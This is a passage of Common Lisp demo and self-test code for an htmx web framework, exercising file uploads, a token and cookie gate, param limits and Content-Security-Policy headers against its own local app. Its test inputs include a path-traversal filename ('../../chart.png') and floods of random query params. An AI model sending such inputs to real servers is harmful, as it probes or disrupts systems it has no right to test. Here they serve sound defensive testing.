    (format t "  (the one <style> is the page stylesheet in <head>)~%")))

(defparameter +png+ (stack-encoding:decode "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" :encoding :base64)
  "A 1x1 PNG.")
(defparameter +gif+ (stack-encoding:decode "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" :encoding :base64)
  "A 1x1 GIF.")

(defun file-value (filename content-type content)
  "A file value as HTMX-REQUEST takes it (:post :multipart): one file of an <input type=file>."
  (list :filename filename :content content :content-type content-type))

(defparameter +chart-png+ (file-value "../../chart.png" "image/png" +png+))
(defparameter +holiday-png+
  (file-value "photos/holiday.png" "image/png"
              (concatenate '(vector (unsigned-byte 8)) +png+ (make-array 6000 :initial-element 0))))
(defparameter +spinner-gif+ (file-value "spinner.gif" "image/gif" +gif+))
(defparameter +empty-input+ (list :filename "")
  "A file input left empty: the browser sends a part with filename \"\" and no content.")

(defun report-coercion (c)
  (format t "  signals ~a: ~a~%    expected ~s, detail ~s~@[, size ~d~]~%    restarts: ~{~(~a~)~^ ~}~%"
          (type-of c) c (canvas:coercion-error-expected c) (canvas:coercion-error-detail c)
          (and (typep c 'canvas:canvas-upload-too-large) (canvas:upload-error-size c))
          (remove-if-not (lambda (n) (member n '(use-value canvas:use-default)))
                         (mapcar #'restart-name (compute-restarts c)))))

(defun wire (octets &optional (limit 600))
  "The first LIMIT of OCTETS as printable text: ASCII as is, CR as \\r, LF as \\n and a
line break, any other octet as \\xNN."
  (with-output-to-string (o)
    (write-string "    " o)
    (loop for i below (min limit (length octets))
          for b = (aref octets i)
          do (case b
               (13 (write-string "\\r" o))
               (10 (format o "\\n~%    "))
               (t (if (<= 32 b 126) (write-char (code-char b) o) (format o "\\x~2,'0X" b)))))
    (when (> (length octets) limit) (format o " … [~d octets in all]" (length octets)))))

(defun received (v)
  "What UPLOAD-IMAGES was called with, in words."
  (cond ((eq v :not-called) "(not called)")
        ((null v) "NIL: the param is missing")
        ((listp v) (format nil "a list of ~d ~s, in part order" (length v) (type-of (first v))))
        (t (format nil "one ~s, not a list" (type-of v)))))

(defun part-line (part)
  (format nil "filename ~s, ~a, ~d octets" (stack-mime:disposition-filename (stack-mime:mime-content-disposition part))
          (stack-mime:media-type-essentials (stack-mime:mime-content-type part)) (length (stack-mime:mime-content part))))

(defun demo-upload (token)
  (banner "7. Uploads end to end: file-input, a multipart form, coerce-param :file (0.2.0)")
  (let ((html (app-resolved (lambda () (canvas:to-html (upload-form))))))
    (format t "the form (a file input inside → enctype=\"multipart/form-data\", which htmx sends as FormData):~%  ~a~%" html)
    (check :multipart-enctype (search "enctype=\"multipart/form-data\"" html)))
  (let* ((codec (rh:htmx-transport-codec *transport*))
         (session (multiple-value-list (login (gated-app token) token)))
         (c (first session))
         (cookie (second session))
         (svg-text (engine-svg))
         (svg (file-value "pipeline.svg" "image/svg+xml" svg-text)))
    (labels ((post (label images &key show-wire)
               ;; HTMX-REQUEST in its two steps (ENCODE-REQUEST-USING-CODEC, then HTMX-REQUEST-ENV),
               ;; so the body can be printed first.
               (let* ((env (rpc:encode-request-using-codec codec (rh:htmx-method-name 'upload-images) (list :images images)
                                                           :http-method :post :encoding :multipart
                                                           :metadata '(:request t :target "upload") :headers cookie))
                      (body (make-array (getf env :content-length) :element-type '(unsigned-byte 8))))
                 (read-sequence body (getf env :raw-body))
                 (setf (getf env :raw-body) (hp:make-octet-input-stream body)
                       *last-images* :not-called)
                 (when show-wire
                   (format t "~&~%the request htmx-client sends (:post :multipart; text fields first, then one raw part per file, no base64):~%  POST ~a~%  Content-Type: ~a~%  Content-Length: ~d~%~a~%"
                           (getf env :path-info) (getf env :content-type) (length body) (wire body)))
                 (let ((r (rh:htmx-request-env c env)))
                   (format t "~&POST UPLOAD-IMAGES images=~a → ~d~%  the handler got IMAGES = ~a~%  ~a~%"
                           label (rh:htmx-reply-status r) (received *last-images*) (text (rh:htmx-reply-body r)))
                   r)))
             (status-and (r needle)
               (and (= 422 (rh:htmx-reply-status r)) (search needle (text (rh:htmx-reply-body r))))))
      (let* ((r (post "../../chart.png + pipeline.svg" (list +chart-png+ svg) :show-wire t))
             (parts *last-images*))
        (check :upload-ok (and (= 200 (rh:htmx-reply-status r)) (= 2 (count-of "<li>" (text (rh:htmx-reply-body r))))))
        (check :several-a-list (and (listp parts) (= 2 (length parts))
                                    (every (lambda (p) (typep p 'stack-mime:mime-entity)) parts)))
        (format t "  the parts, as the codec decoded them (MIME-CONTENT octet for octet as sent):~%")
        (loop for p in parts
              for sent in (list +png+ (stack-encoding:encode svg-text :encoding :utf-8))
              do (format t "    ~a, intact: ~s~%" (part-line p) (check :octets-intact (equalp (stack-mime:mime-content p) sent))))
        (format t "  coerce-param :file kept only the last path segment of ../../chart.png; the PNG's CR LF, NUL and 1A octets survive~%"))
      (let* ((r (post "photos/holiday.png (6070 octets)" +holiday-png+))
             (big *last-images*))
        (format t "  HX-Retarget ~a, HX-Reswap ~a~%" (rh:htmx-reply-header r "hx-retarget") (rh:htmx-reply-header r "hx-reswap"))
        (check :too-large-422 (status-and r (format nil "images must be at most ~d bytes" +max-image-bytes+)))
        (let ((r (post "an empty file input (filename \"\", no content)" +empty-input+)))
          (check :empty-missing (and (null *last-images*) (= 422 (rh:htmx-reply-status r)))))
        (let* ((r (post "spinner.gif" +spinner-gif+))
               (gif *last-images*)
               (field (list :field "images" :max-size +max-image-bytes+ :accept +image-accept+)))
          (check :accept-422 (status-and r "images must be a file of type"))
          (format t "~&~%the same decoded parts in the image, through coerce-param with restarts (the handler has none):~%")
          (format t "photos/holiday.png (~a) →~%" (part-line big))
          (let ((v (handler-bind ((canvas:canvas-coercion-error
                                    (lambda (c) (report-coercion c) (check :too-large (typep c 'canvas:canvas-upload-too-large))
                                      (invoke-restart 'canvas:use-default))))
                     (apply #'canvas:coerce-param big :file :default :no-image field))))
            (format t "  use-default → ~s~%" v))
          (format t "spinner.gif (~a) →~%" (part-line gif))
          (let ((v (handler-bind ((canvas:canvas-coercion-error
                                    (lambda (c) (report-coercion c) (check :wrong-type (eq :accept (canvas:coercion-error-expected c)))
                                      (format t "    the error fragment next to the input: ~a~%" (canvas:to-html (canvas:error-fragment c)))
                                      (invoke-restart 'use-value :skipped))))
                     (apply #'canvas:coerce-param gif :file field))))
            (format t "  use-value :skipped → ~s~%" v)))))))

;;; ---- 0.3.0: hardening ---------------------------------------------------------
;;; All through htmx-client on a fresh gated app, as a browser (or a hostile
;;; script) would send it. Token and cookie values are never printed: their
;;; lengths, or <token>.

(defun keyword-count ()
  "The number of symbols in the KEYWORD package."
  (let ((n 0)) (do-symbols (s :keyword n) (declare (ignore s)) (incf n))))

(defun random-names (n)
  "N distinct random names of 10 lowercase letters and digits, none of which names a
keyword. FIND-SYMBOL only: making them interns nothing."
  (let ((names (make-hash-table :test #'equal))
        (*random-state* (make-random-state t)))
    (loop while (< (hash-table-count names) n)
          do (let ((name (format nil "~(~36r~)" (+ (expt 36 9) (random (- (expt 36 10) (expt 36 9)))))))
               (unless (find-symbol (string-upcase name) :keyword)
                 (setf (gethash name names) t))))
    (loop for name being the hash-keys of names collect name)))

(defun query-of (names) (format nil "?~{~a=1~^&~}" names))

(defun attribute-value (html attribute)
  "The first ATTRIBUTE=\"…\" value in HTML, &amp; read back as &."
  (let* ((key (format nil "~a=\"" attribute))
         (start (+ (search key html) (length key)))
         (value (subseq html start (position #\" html :start start))))
    (loop for i = (search "&amp;" value) while i
          do (setf value (concatenate 'string (subseq value 0 (1+ i)) (subseq value (+ i 5)))))
    value))

(defun csp-headers (reply)
  "Every Content-Security-Policy value of REPLY, in order."
  (loop for (name . value) in (rh:htmx-reply-headers reply)
        when (string-equal name "content-security-policy") collect value))

(defun demo-hardening (token)
  (banner "8. Hardening (rpc-backend-htmx 0.3.0): the token gate, request keys, the param cap, CSP")
  (let ((c (rh:make-htmx-client (gated-app token) :codec (rh:htmx-transport-codec *transport*)))
        (replies '())
        (cookie nil))
    (labels ((send (label url &rest keys)
               (let ((r (apply #'rh:htmx-request-url c url keys)))
                 (push r replies)
                 (format t "~&~a → ~d~%" label (rh:htmx-reply-status r))
                 r))
             (body (r) (text (rh:htmx-reply-body r)))
             (status= (r status) (= status (rh:htmx-reply-status r))))
      (format t "the app: (htmx-app *transport* *handlers* :token token); the token is ~d chars of (stack-secrets:token-urlsafe 32)~%~%"
              (length token))
      (let* ((clean (page-path 'test-table "?sort=-tests"))
             (one-time (rh:htmx-token-url clean token))
             (r (send (format nil "GET ~a, no cookie" clean) clean :hx-request nil)))
        (format t "  ~a~%" (body r))
        (check :no-cookie-403 (status= r 403))
        (let* ((r (send (format nil "GET ~a (the one-time URL)" (redact one-time token)) one-time :hx-request nil))
               (set-cookie (remember-secret (first-value (rh:htmx-reply-header r "set-cookie"))))
               (location (rh:htmx-reply-header r "location")))
          (format t "  Location ~a~%  Set-Cookie ~a~%  Cache-Control ~a~%  the cookie's value is the bootstrap token: ~s (a separate per-app session secret)~%"
                  location (cookie-shape set-cookie) (rh:htmx-reply-header r "cache-control")
                  (string= (cookie-value set-cookie) token))
          (check :exchange-303 (and (status= r 303) (string= location clean) (string= "" (body r))))
          (check :cookie-attributes (string= (subseq set-cookie (position #\; set-cookie)) "; Path=/; HttpOnly; SameSite=Strict"))
          (check :session-not-token (string/= (cookie-value set-cookie) token))
          (setf cookie `(("cookie" . ,(cookie-pair set-cookie)))))
        (let ((r (send "GET the clean URL (Location) with that cookie" clean :hx-request nil :headers cookie)))
          (format t "  ~a, a full page of ~d chars~%" (rh:htmx-reply-header r "content-type") (length (body r)))
          (check :clean-url-200 (and (status= r 200) (search "<!DOCTYPE html>" (body r)))))
        (check :reuse-403 (status= (send "GET the one-time URL again" one-time :hx-request nil) 403))
        (check :reuse-403 (status= (send "GET the one-time URL again, with the cookie" one-time :hx-request nil :headers cookie) 403))
        (check :no-cookie-403 (status= (send "GET the clean URL, no cookie" clean :hx-request nil) 403))
        (check :token-as-cookie-403
               (status= (send "GET the clean URL, the bootstrap token as the cookie" clean :hx-request nil
                              :headers `(("cookie" . ,(format nil "~a=~a" rh:+default-token-name+ token))))
                        403)))
      (format t "~&~%request keys: each canvas takes the keys of its lambda list (htmx-handler-keys)~%")
      (dolist (name '(dashboard test-table test-chart ticker grid-key upload-images))
        (format t "  ~14a ~s~%" name (rh:htmx-handler-keys *handlers* (rh:htmx-method-name name))))
      (let ((r (send "GET DASHBOARD (HX-Request), a canvas with no parameters: (defun dashboard () …)"
                     (page-path 'dashboard) :headers cookie)))
        (format t "  ~a~%" (clip (body r) 100))
        (check :zero-arg-200 (and (status= r 200) (search "<main>" (body r)))))
      (let* ((table (body (send "GET TEST-TABLE (HX-Request)" (page-path 'test-table) :headers cookie)))
             (link (attribute-value table "hx-get")))
        (check :header-link-no-page (not (search "page=" link)))
        (check :header-click-200
               (status= (send (format nil "its first header button, clicked: GET ~a" link) link :headers cookie) 200)))
      (let ((r (send "GET TEST-TABLE?srot=tests (a typo: no keyword has that name)" (page-path 'test-table "?srot=tests")
                     :headers cookie)))
        (format t "  ~a~%" (body r))
        (check :unknown-400 (and (status= r 400) (search "Unknown param srot" (body r)))))
      (let ((r (send "GET DASHBOARD?sort=tests (:SORT exists, but DASHBOARD takes nothing)" (page-path 'dashboard "?sort=tests")
                     :headers cookie)))
        (format t "  ~a~%" (body r))
        (check :unknown-400 (and (status= r 400) (search "Unknown param sort" (body r)))))
      (let* ((cap (rh:htmx-codec-max-params (rh:htmx-transport-codec *transport*)))
             (names (random-names 10000))
             (before (keyword-count))
             (sent 0))
        (format t "~&~%the param cap and the KEYWORD package (max-params ~d, the default):~%KEYWORD package: ~d symbols~%" cap before)
        (let ((r (send (format nil "GET DASHBOARD with ~d random names" cap) (page-path 'dashboard (query-of (subseq names 0 cap)))
                       :headers cookie)))
          (format t "  ~a~%" (body r))
          (check :at-cap-400 (status= r 400)))
        (let ((r (send (format nil "GET DASHBOARD with ~d random names" (1+ cap)) (page-path 'dashboard (query-of (subseq names 0 (1+ cap))))
                       :headers cookie)))
          (format t "  ~a~%" (body r))
          (check :over-cap-413 (status= r 413)))
        (incf sent (+ cap cap 1))
        (let ((statuses (loop for i from 0 below (length names) by cap
                              for batch = (subseq names i (min (length names) (+ i cap)))
                              for r = (rh:htmx-request-url c (page-path 'dashboard (query-of batch)) :headers cookie)
                              do (push r replies) (incf sent (length batch))
                              collect (rh:htmx-reply-status r))))
          (format t "~d GETs of ~d random names each (~d distinct names, none of them a keyword) → ~{~d~^ ~}~%"
                  (length statuses) cap (length names) statuses)
          (check :random-names-400 (every (lambda (s) (= s 400)) statuses))
          (let ((after (keyword-count)))
            (format t "KEYWORD package after those ~d requests (~d names): ~d symbols, unchanged: ~s~%"
                    (+ 2 (length statuses)) sent after (check :keywords-unchanged (= before after))))))
      (format t "~&~%Content-Security-Policy (the canvas transport sends +default-csp+ unless told otherwise):~%")
      (let ((r (send "GET DASHBOARD, no HX-Request (a full page)" (page-path 'dashboard) :hx-request nil :headers cookie)))
        (format t "  Content-Type ~a~%  Content-Security-Policy ~a~%" (rh:htmx-reply-header r "content-type")
                (rh:htmx-reply-header r "content-security-policy"))
        (check :csp-page (equal (csp-headers r) (list rh:+default-csp+))))
      (let ((r (send "GET TICKER?n=2, Accept: text/event-stream" (page-path 'ticker "?n=2") :accept "text/event-stream"
                     :headers cookie)))
        (format t "  Content-Type ~a~%  Content-Security-Policy ~a~%  events ~s~%" (rh:htmx-reply-header r "content-type")
                (rh:htmx-reply-header r "content-security-policy") (rh:htmx-reply-events r))
        (check :csp-sse (and (equal (csp-headers r) (list rh:+default-csp+)) (= 2 (length (rh:htmx-reply-events r))))))
      (format t "every reply of this section (~d, statuses ~{~d~^ ~}) has exactly one Content-Security-Policy, that one: ~s~%"
              (length replies) (sort (remove-duplicates (mapcar #'rh:htmx-reply-status replies)) #'<)
              (check :csp-every-reply (every (lambda (r) (equal (csp-headers r) (list rh:+default-csp+))) replies))))))

(defun run-demos (&key (port 18467) (dir (uiop:getcwd)))
  (setf http-backend-async:*event-backend-maker* #'event-backend-libuv:make-libuv-backend
        canvas:*canvas-theme* :engels)
  (let* ((token (stack-secrets:token-urlsafe 32)) ; the bootstrap token: 32 octets, base64url
         (printed (make-string-output-stream))    ; a copy of everything printed, scanned for secrets at the end
         (*standard-output* (make-broadcast-stream *standard-output* printed))
         (hp:*http-backend* (http-backend-async:make-async-backend))
         (hp:*http-client* (hp:make-http-client hp:*http-backend*)))
    (setf *secrets* (list token))
    (format t "canvas-protocol ~a, rpc-backend-htmx ~a, theme ~s, chart backend ~s, htmx ~a + sse ~a~%token: ~d chars (printed as <token>)~%"
            (asdf:component-version (asdf:find-system "canvas-protocol"))
            (asdf:component-version (asdf:find-system "rpc-backend-htmx")) canvas:*canvas-theme*
            (type-of canvas:*chart-backend*) canvas:+htmx-version+ canvas:+htmx-sse-version+ (length token))
    (demo-in-process token)
    (srv:with-server (s (gated-app token) :port port)
      (format t "~&serving on http://127.0.0.1:~d/canvas/ (Hunchentoot)~%" port)
      (demo-http port token)
      (demo-freeze dir)                 ; before the redefinition: the bar chart
      (demo-redefine port))
    (format t "~&~%server stopped~%")
    (setf *checks* '())
    (let ((*print-pretty* nil))        ; one line per printed list
      (demo-keys token)
      (demo-svg dir)
      (demo-upload token)
      (demo-hardening token))
    (let ((output (get-output-stream-string printed)))
      (format t "~&~%secrets of this run: the token and ~d session cookies; any of them in the output above: ~s~%"
              (1- (length *secrets*))
              (not (check :secrets-unprinted (notany (lambda (s) (search s output)) *secrets*)))))
    (let ((checks '()))                 ; one entry per name, in first-seen order, AND of its values
      (loop for (k . v) in (reverse *checks*)
            for cell = (assoc k checks)
            do (if cell (setf (cdr cell) (and (cdr cell) v)) (push (cons k v) checks)))
      (setf checks (nreverse checks))
      (format t "~&~%self-check (sections 5-8): ~{~(~a~) ~s~^, ~}~%all ~d true: ~s~%"
              (loop for (k . v) in checks collect k collect v) (length checks) (every #'cdr checks)))
    t))
